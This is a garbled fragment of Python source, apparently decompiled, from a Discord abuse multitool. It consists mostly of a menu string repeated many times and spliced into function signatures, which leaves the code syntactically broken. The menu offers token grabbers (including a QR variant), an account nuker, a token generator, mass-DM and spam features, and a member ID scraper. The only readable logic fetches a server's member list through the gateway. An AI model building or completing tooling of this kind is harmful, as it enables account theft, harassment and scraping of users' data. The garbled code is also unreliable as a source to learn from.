'][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}'''], guild_id = []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8']):
                if bot.gateway.finishedMemberFetching(guild_id):
                    lenmembersfetched = len(bot.gateway.session.guild(guild_id).members)
                    print(str(lenmembersfetched) + ' members fetched')
                    bot.gateway.removeCommand({
                        'function': close_after_fetching,
                        'params': {
                            'guild_id': guild_id } })
                    bot.gateway.close()
                    return None

            
            def get_members(guild_id = []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''], channel_id = []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       